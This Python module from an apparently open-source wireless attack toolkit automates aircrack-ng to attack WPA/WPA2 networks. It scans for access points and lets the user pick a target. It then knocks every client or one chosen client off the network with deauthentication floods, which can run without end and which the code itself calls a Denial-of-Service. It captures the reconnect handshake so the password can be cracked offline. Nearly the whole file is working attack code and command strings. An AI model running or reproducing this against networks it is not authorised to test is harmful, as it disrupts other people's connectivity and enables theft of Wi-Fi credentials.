#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   use_aircrack.py - Use aircrack-ng to crack WPA/WPA2.
#    Copyright (C) 2018 Yudhajit N. (Sh3llcod3)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>
#   Contact: Please create a issue on my GitHub <https://github.com/Sh3llcod3>
#
#Import necessary module
import time
import csv
#Import our custom module
from modules import *
#Create our 'aircrack' class
class aircrackObj(object):
    def __init__(self,colors):
        self.colors = colors
        self.signalMapDict = {-55 : self.colors.green_deep + "Strong" + self.colors.endl,
        -67 : self.colors.yellow_deep + "Medium" + self.colors.endl,
        -75 : self.colors.pink_deep + "Weak  " + self.colors.endl,
        -99 : self.colors.red_deep + "Faint " + self.colors.endl}
    def showLogo(self):
        #This wasn't done by hand.
        #Some quick base64 + list comprehension + some print statements!
        aircrackLogo = ("CiDilojilojilojilojilojilZcg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pW"
        "XICDilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgIOKWiO"
        "KWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWXICAgICDilojilojil"
        "ojilZcgICDilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIArilojilojilZTi"
        "lZDilZDilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZfiloj"
        "ilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilo"
        "jilZTilZDilZDilZDilZDilZ3ilojilojilZEg4paI4paI4pWU4pWdICAgICDilojil"
        "ojilojilojilZcgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnSAK4paI"
        "4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pW"
        "U4pWd4paI4paI4pWRICAgICDilojilojilojilojilojilojilZTilZ3ilojilojilZ"
        "EgICAgIOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWi"
        "OKVlOKWiOKWiOKVlyDilojilojilZHilojilojilZEgIOKWiOKWiOKWiOKVlwriloji"
        "lojilZTilZDilZDilojilojilZHilojilojilZHilojilojilZTilZDilZDilojiloj"
        "ilZfilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkS"
        "AgICAg4paI4paI4pWU4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4"
        "pWR4pWa4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAg4paI4paI4pWRCuKWiOKW"
        "iOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilZriloj"
        "ilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiO"
        "KWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWXICAgICDilojilojilZEg4pWa4"
        "paI4paI4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWU4pWdCuKVmuKVkOKV"
        "nSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0g4pWa4pWQ4pW"
        "Q4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4p"
        "WQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWQ4"
        "pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAKICAgICAgICAgICAgICAgICAgICAg"
        "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA"
        "gICAgCg==")
        startupInfo = returnGreenDeep(self.colors,"Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2018.")
        fullLogo = b64D(aircrackLogo)
        print(fullLogo)
        printInfo(self.colors,startupInfo)
    #Define our re-usable methods.
    #Map signal values to arbitrary strengths
    def fetchSignalValue(self, valueToCompare, mappingDict=None):
        if mappingDict is None:
            mappingDict = self.signalMapDict
        valueToCompare = int(valueToCompare)
        for i in sorted(mappingDict, reverse=True):
            if valueToCompare >= i:
                return mappingDict[i]
    #Fix spacing and indentation
    def aSpace(self, inputVal, lenVal):
        if len(inputVal) < lenVal:
            return inputVal + " " * (lenVal - len(inputVal))
        else:
            return inputVal
    #Get rid of any WhiteSpace
    def stripWhitespace(self, valueToStrip):
        return valueToStrip.strip()
    #Create temporary files
    def createTempFiles(self):
        if bashReturnValue("ls HANDSHAKES/") != "0":
            bashRun("mkdir HANDSHAKES")
    #Choose a card and put it in monitor mode.
    def selectInitialCard(self):
        COLOR = self.colors
        stopNetworkManager()
        self.firstCard = wirelessCard()
        self.firstCard.enumerateCards()
        createNewLine()
        printGreen(COLOR,"Your cards are:")
        createNewLine()
        self.firstCard.listCards(COLOR)
        createNewLine()
        chooseCardQuestion = "{}[?] {}What card do you want to use?".format(COLOR.yellow_deep,COLOR.pink_deep)
        chooseCardQuestion += " {}(enter #) {}>> ".format(COLOR.green_deep,COLOR.pink_deep)
        while True:
            try:
                self.firstCard.resetCards()
                userAskedCard = int(input(chooseCardQuestion))
                if self.firstCard.verifyChosenCard(userAskedCard):
                    if self.firstCard.chooseCard(userAskedCard):
                        if yesNo("Use {}".format(returnGreenDeep(COLOR,self.firstCard.cardName + "?")),COLOR):
                            self.firstCard.setMonitorMode()
                            break
                        else:
                            raise NameError
                else:
                    printYellow(COLOR,returnYellow(COLOR,"That's not a valid card, please try again."))
                    createNewLine()
            except(ValueError):
                printYellow(COLOR,returnRed(COLOR,"Please enter an integer."))
                createNewLine()
                self.firstCard.resetCards()
                continue
            except(NameError):
                printSuccess(COLOR,returnBlue(COLOR,"Let's choose another card then."))
                createNewLine()
                self.firstCard.resetCards()
                continue
        printSuccess(COLOR,"{1}{0} is in Monitor mode.{2}".format(
            self.firstCard.cardName, 
            COLOR.light_blue, 
            COLOR.endl))
        createNewLine()
    #Explore for the target AP
    def gatherInitialData(self):
        COLOR = self.colors
        printDeepBlue(COLOR,returnBold(COLOR, "Let's run Airodump-ng for 5~ seconds to gather all the APs."))
        printDeepBlue(COLOR,returnBlue(COLOR, "Press {0}CTRL+C{1} once you see your target network.".format(COLOR.green_deep,COLOR.blue_deep)))
        input("{0}[i]{1} {2}Once you're ready, press enter. >>{1} ".format(COLOR.blue_deep,COLOR.endl, COLOR.yellow_deep))
        self.csvFilePath = ioStream('mktemp HANDSHAKES/TEMP_DUMP_XXXX')
        fetchAllAPs = "~/.airscriptNG/air/*/src/airodump-ng -a -w {}".format(self.csvFilePath)
        fetchAllAPs += " --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one {}".format(self.firstCard.cardName)
        getCurrentTime = time.time()
        try:
            bashRun(fetchAllAPs)
        except(KeyboardInterrupt,EOFError):
            if round(time.time()-getCurrentTime) < 3:
                printRed(COLOR,"Not enough time has elapsed to gather sufficient data. Please try again.")
                printRed(COLOR,"Quitting program.")
                self.callCompleteCleanup()
                normalQuit(1)
    #Parse the CSV data obtained from running Airodump on all APs
    def parseCsvData(self):
        COLOR = self.colors
        csvPath = self.csvFilePath + "-01.csv"
        self.apList = []
        apCounter = 0
        clientCounter = 0
        with open(csvPath, newline="") as airodumpFile:
            csvReader = csv.reader(airodumpFile, delimiter=",", quotechar="|")
            for i in csvReader:
                if len(i) > 9:
                    if apCounter != 0:
                        INDEX = apCounter
                        BSSID = self.stripWhitespace(i[0])
                        CHANNEL = self.stripWhitespace(i[3])
                        PRIV = self.stripWhitespace(i[5][:5])
                        CIPHER = self.stripWhitespace(i[6][:5])
                        AUTH = self.stripWhitespace(i[7])
                        PWR = self.fetchSignalValue(i[8])
                        ESSID = self.stripWhitespace(i[-2])
                        self.apList.append([INDEX,BSSID,CHANNEL,PRIV,CIPHER,AUTH,PWR,ESSID])
                    apCounter += 1
                elif len(i) < 9 and len(i) > 0:
                    if clientCounter !=0:
                        AP_MAC = i[-2].lstrip().rstrip()
                        for AP in self.apList:
                            if AP_MAC in AP:
                                AP_INDEX = self.apList.index(AP)
                                self.apList[AP_INDEX].append(None)
                    clientCounter += 1
        clearTerm()
        print("--------------------------------------------------------------------------------------------------")
        print("│{}NO.  BSSID             CHANNEL  PRIVACY   CIPHER   AUTH   POWER   ESSID                         {}│".format(COLOR.red_deep,COLOR.endl))
        print("--------------------------------------------------------------------------------------------------")
        for i in self.apList:
            def fixIndexAlignment():
                if i[-1] is None:
                    PREFIX = COLOR.yellow_deep + "*" + COLOR.endl
                else:
                    PREFIX = " "
                if len(str(i[0])) < 2:
                    return "[{1}{0}{2}]".format(i[0], COLOR.red_deep, COLOR.endl) + PREFIX + " "
                else:
                    if PREFIX == " ":
                        return "[{1}{0}{2}]".format(i[0], COLOR.red_deep, COLOR.endl) + " "
                    else:
                        return "[{1}{0}{2}]".format(i[0], COLOR.red_deep, COLOR.endl) + PREFIX
            fixChannelAlignment = lambda: "{} ".format(i[2]) if len(i[2]) < 2 else "{}".format(i[2])
            spaceFix = lambda inputVal,spaceVal: " " * spaceVal if inputVal == "" else inputVal
            CSV_1 = fixIndexAlignment()
            CSV_2 = self.aSpace(i[1],17)
            CSV_3 = "   " + self.aSpace(fixChannelAlignment(),2)
            CSV_4 = "     " + self.aSpace(spaceFix(i[3],4),4)
            CSV_5 = "    " + self.aSpace(spaceFix(i[4],4),4)
            CSV_6 = "    " + self.aSpace(spaceFix(i[5],3),3)
            CSV_7 = "  " + self.aSpace(spaceFix(i[6],6),6)
            CSV_8 = " " + self.aSpace(spaceFix(i[7].replace("\\x00", ""),12),12)
            print(CSV_1,CSV_2,CSV_3,CSV_4,CSV_5,CSV_6,CSV_7,CSV_8)
        print("\n({}*{}) Indicates that there are clients.\n".format(COLOR.yellow_deep,COLOR.endl))
    #Kick everyone out, effectively creating a Denial-Of-Serivce.
    def deauthAllClients(self):
        apTargetList = self.selectedNetworkTarget
        COLOR = self.colors
        while True:
            try:
                printDeepBlue(COLOR, "How many deauths would you like to send?")
                printDeepBlue(COLOR, "Typing '0' will result in infinite disconnects.")
                printDeepBlue(COLOR, "You can stop the deauth procedure by pressing CTRL+C any-time.\n")
                askNumDeauth = int(input(returnBlue(COLOR, "Please enter number >> ")))
                if askNumDeauth > -1:
                    self.apDeauthCount = askNumDeauth
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid deauth amount entered, please enter a number 0 onwards.")
                continue
        clearTerm()
        printInfo(COLOR, "A white (XTERM) window will now appear.")
        printInfo(COLOR, "Once you see {1}WPA handshake: {0}{2} at the top right, close the window.".format(
            apTargetList[1],
            COLOR.red_deep,
            COLOR.endl))
        printInfo(COLOR, "You can press (x) or CTRL+C on the white window to close it.\n")
        input(returnGreenDeep(COLOR, "Ready? Press enter >> "))
        finalDeauthCommand = ("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'"
                              " -bg '#FFFFFF' -fg '#000000' -e 'trap \":\" SIGINT; ~/.airscriptNG/air/*/src/aireplay-ng"
                              " -0 {0} -a {1} {2} --ignore-negative-one ; trap - SIGINT ; ~/.airscriptNG/air/*/src/airodump-ng"
                              " --output-format pcap -w {3} -c {4} --bssid {1} --ignore-negative-one {2}'".format(
                              self.apDeauthCount,
                              apTargetList[1],
                              self.firstCard.cardName,
                              self.captureFileTemp,
                              apTargetList[2]))
        bashRun("iwconfig {} channel {}".format(self.firstCard.cardName, apTargetList[2]))
        bashRun(finalDeauthCommand)
    #Only disconnect one client, it's less disruptive then kicking everyone out.
    def deauthSelectedClient(self):
        COLOR = self.colors
        CARD = self.firstCard.cardName
        apTargetList = self.selectedNetworkTarget
        printInfo(COLOR, "Let's enumerate the clients connected to the AP.")
        printInfo(COLOR, "We'll run airodump-ng again, focusing on the AP this time.")
        printInfo(COLOR, "Once you see a client (Station MAC) you want to disconnect, press CTRL+C.\n")
        input(returnGreenDeep(COLOR, "Ready? Press enter >> "))
        self.listOfClients = ioStream('mktemp -u HANDSHAKES/CLIENTS_LIST_XXXX')
        self.clientsCsvPath = self.listOfClients + "-01.csv"
        getClientsCommand = ("~/.airscriptNG/air/*/src/airodump-ng"
                             " -w {0} --output-format csv -I 3"
                             " -c {1} --bssid {2} --ignore-negative-one {3}".format(
                             self.listOfClients,
                             apTargetList[2],
                             apTargetList[1],
                             CARD))
        bashRun("iwconfig {} channel {}".format(CARD, apTargetList[2]))
        try:
            bashRun(getClientsCommand)
        except(KeyboardInterrupt, EOFError):
            pass
        clientAssocList = []
        clientCounter = 0
        with open(self.clientsCsvPath, newline="") as clientFile:
            clientReader = csv.reader(clientFile, delimiter=",", quotechar="|")
            for i in clientReader:
                if len(i) < 9 and len(i) > 0:
                    if clientCounter != 0:
                        _AP_MAC = self.stripWhitespace(i[-2])
                        _STA_MAC = self.stripWhitespace(i[0])
                        _CLIENT_PWR = self.fetchSignalValue(self.stripWhitespace(i[-4]))
                        _RX_PACKETS = self.stripWhitespace(i[-3])
                        clientAssocList.append([clientCounter, _STA_MAC, _CLIENT_PWR, _RX_PACKETS, _AP_MAC])
                    clientCounter += 1
        clearTerm()
        print("-----------------------------------------------------------------------")
        print("│{}NO.    STA MAC         SIGNAL  PACKETS    AP MAC                     {}│".format(COLOR.red_deep,COLOR.endl))
        print("-----------------------------------------------------------------------")
        for i in clientAssocList:
            fixNumberIndex = lambda: "[{1}{0}{2}] ".format(i[0], COLOR.red_deep, COLOR.endl) if len(str(i[0])) < 2 else "[{1}{0}{2}]".format(i[0], COLOR.red_deep, COLOR.endl)
            _STA_MAC_ = self.aSpace(i[1], 17)
            _SIGNAL_ = " " + self.aSpace(i[2], 6)
            _RX_PKTS_ = " " * 2 + self.aSpace(i[3], 6) + " " * 3
            _AP_MAC_ = self.aSpace(i[4], 17)
            print(fixNumberIndex(),_STA_MAC_,_SIGNAL_,_RX_PKTS_,_AP_MAC_)
        while True:
            try:
                createNewLine()
                getClientChoice = int(input(returnPink(COLOR, "Please enter No.(#) of client to be de-authed. >> ")))
                if getClientChoice <= int(clientAssocList[-1][0]) and getClientChoice > 0:
                    self.clientDeauthTarget = clientAssocList[getClientChoice - 1][1]
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid client selected, please try again.")
                continue
            except(IndexError):
                createNewLine()
                printRed(COLOR, "Couldn't find any target clients, please try again.")
                createNewLine()
                self.callCompleteCleanup()
                normalQuit(1)
        clearTerm()
        while True:
            try:
                printDeepBlue(COLOR, "How many times would you like to deauth the client?")
                printDeepBlue(COLOR, "Typing '0' will result in infinite disconnects.")
                printDeepBlue(COLOR, "You can stop the deauth procedure by pressing CTRL+C any-time.\n")
                askClientDeauthNumber = int(input(returnBlue(COLOR, "Please enter number of deauths to send. >> ")))
                if askClientDeauthNumber > -1:
                    self.selectiveDeauthNumber = askClientDeauthNumber
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid deauth amount entered, please enter a number 0 onwards.")
                continue
        clearTerm()
        printInfo(COLOR, "A white (XTERM) window will now appear.")
        printInfo(COLOR, "Once you see {1}WPA handshake: {0}{2} at the top right, close the window.".format(
            apTargetList[1],
            COLOR.red_deep,
            COLOR.endl))
        printInfo(COLOR, "You can press (x) or CTRL+C on the white window to close it.\n")
        input(returnGreenDeep(COLOR, "Ready? Press enter >> "))
        bashRun("iwconfig {} channel {}".format(CARD, apTargetList[2]))
        finalSelectiveDeauthCommand = ("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: {0} & CAPTURING'"
                                       " -bg '#FFFFFF' -fg '#000000' -e 'trap \":\" SIGINT ; ~/.airscriptNG/air/*/src/aireplay-ng"
                                       " -0 {1} -a {2} -c {0} {3} --ignore-negative-one ; trap - SIGINT ; ~/.airscriptNG/air/*/src/airodump-ng"
                                       " --output-format pcap -w {4} -c {5} --bssid {2} --ignore-negative-one {3}'".format(
                                       self.clientDeauthTarget,
                                       self.selectiveDeauthNumber,
                                       apTargetList[1],
                                       CARD,
                                       self.captureFileTemp,
                                       apTargetList[2]))
        bashRun(finalSelectiveDeauthCommand)
    #Don't disconnect anyone, very stealthy.
    def dontDeauthClient(self):
        apTargetList = self.selectedNetworkTarget
        COLOR = self.colors
        CARD = self.firstCard.cardName
        printDeepBlue(COLOR, "You have selected not to disconnect anyone.")
        printDeepBlue(COLOR, "You will need to wait until someone joins the network.")
        printDeepBlue(COLOR, "When they join, a Handshake will be captured.")
        createNewLine()
        printInfo(COLOR, "A white (XTERM) window will now appear.")
        printInfo(COLOR, "Once you see {1}WPA handshake: {0}{2} at the top right, close the window.".format(
            apTargetList[1],
            COLOR.red_deep,
            COLOR.endl))
        printInfo(COLOR, "You can press (x) or CTRL+C on the white window to close it.\n")
        input(returnGreenDeep(COLOR, "Ready? Press enter >> "))
        bashRun("iwconfig {} channel {}".format(CARD, apTargetList[2]))
        passiveHandshakeCommand = ("xterm -geometry 100x25+4320+7640 -title 'PASSIVELY WAITING FOR HANDSHAKE...'"
                                   " -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/airodump-ng"
                                   " --output-format pcap -w {0} -c {1} --bssid {2} --ignore-negative-one {3}'".format(
                                   self.captureFileTemp,
                                   apTargetList[2],
                                   apTargetList[1],
                                   CARD))
        try:
            bashRun(passiveHandshakeCommand)
        except(KeyboardInterrupt, EOFError):
            pass
    #Select Target AP and how to obtain handshake from AP.
    def selectTargetNetwork(self):
        COLOR = self.colors
        TERM = COLOR.endl
        deauthCallerDict = {1 : self.deauthAllClients, 2 : self.deauthSelectedClient, 3 : self.dontDeauthClient}
        deauthDescriptionDict = \
        {1 : "Disconnect all connected users and wait for them to re-connect.",
         2 : "Disconnect a specific client and wait for it to re-connect.",
         3 : "Don't disconnect anyone, wait passively for someone to join the network."}
        while True:
            try:
                getUserChoice = int(input(returnBlue(COLOR,"Please enter No.(#) of the network you want >> ")))
                if getUserChoice <= int(self.apList[-1][0]) and getUserChoice > 0:
                    self.selectedNetworkTarget = self.apList[getUserChoice - 1]
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid network selected, please try again.")
                continue
        self.captureFileTemp = ioStream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX')
        bashRun("rm {} 2>/dev/null".format(self.captureFileTemp))
        #This is the attribute we want to pass to the handshake cracker.
        self.captureFilePath  = ioStream("pwd") + "/" + self.captureFileTemp + "-01.cap"
        target = self.selectedNetworkTarget
        _ESSID = target[7]
        _POWER = target[6]
        _AUTH = target[5]
        _CIPHER = target[4]
        _PRIV = target[3]
        _CH = target[2]
        _BSSID = target[1]
        _NUM = target[0]
        clearTerm()
        print("{0}[+]{1}SELECTED NETWORK: {2}{3}{1}".format(COLOR.green_deep,TERM,COLOR.red_deep,_ESSID))
        print("\n[" + returnGreenDeep(COLOR, "CAP FILE") + "]: {}".format(self.captureFilePath))
        print("[" + returnGreenDeep(COLOR, "CHANNEL") +"]: {}".format(_CH))
        print("[" + returnGreenDeep(COLOR, "BSSID (AP MAC)") + "]: {}".format(_BSSID))
        print("[" + returnGreenDeep(COLOR, "ESSID (AP SSID)") + "]: {}".format(_ESSID))
        print("[" + returnGreenDeep(COLOR, "CIPHER") + "]: {}".format(_CIPHER))
        print("[" + returnGreenDeep(COLOR, "SIGNAL STRENGTH") + "]: {}".format(_POWER))
        print("[" + returnGreenDeep(COLOR, "AUTHENTICATION") + "]: {}".format(_PRIV))
        createNewLine()
        printSuccess(COLOR, "Successfully chosen network, let's get a handshake.")
        printInfo(COLOR, "There are 3 ways of approaching this:\n")
        for i in sorted(deauthDescriptionDict.items()):
            print(returnRed(COLOR, i[0]) + ") " + i[1])
        createNewLine()
        printDeepBlue(COLOR, "The idea here is that when someone connects, we capture their handshake.")
        printDeepBlue(COLOR, "Then we can take that handshake and crack it offline with Hashcat or Aircrack-ng.")
        while True:
            try:
                getDeauthChoice = int(input(returnYellow(COLOR, "Which option do you want? >> ")))
                if getDeauthChoice in deauthCallerDict.keys():
                    self.sendDeauthChoice = deauthCallerDict[getDeauthChoice]
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid choice selected, please enter a number.")
                continue
        clearTerm()
        self.sendDeauthChoice()
    #Remove temporary files and set card in monitor mode
    def callCompleteCleanup(self):
        COLOR = self.colors
        sysWrite("{}[wait]{} Cleaning up, please hold. \r".format(
            COLOR.yellow_dark,
            COLOR.endl))
        self.firstCard.setManagedMode()
        sysWrite("{}[ok]{} Set cards to managed mode.  \r".format(
            COLOR.green_deep,
            COLOR.endl))
        if hasattr(self, "csvFilePath"):
            bashRun("rm " + self.csvFilePath + "* 2>/dev/null")
        if hasattr(self, "clientsCsvPath"):
            bashRun("rm " + self.clientsCsvPath + " 2>/dev/null")
        sysWrite("{}[wait]{} Starting Network-Manager service. \r".format(
            COLOR.yellow_dark,
            COLOR.endl))
        startNetworkManager()
        print("{0}[done]{1} Successfully cleaned up. {2}\n".format(
            COLOR.green_deep,
            COLOR.endl,
            " " * 100))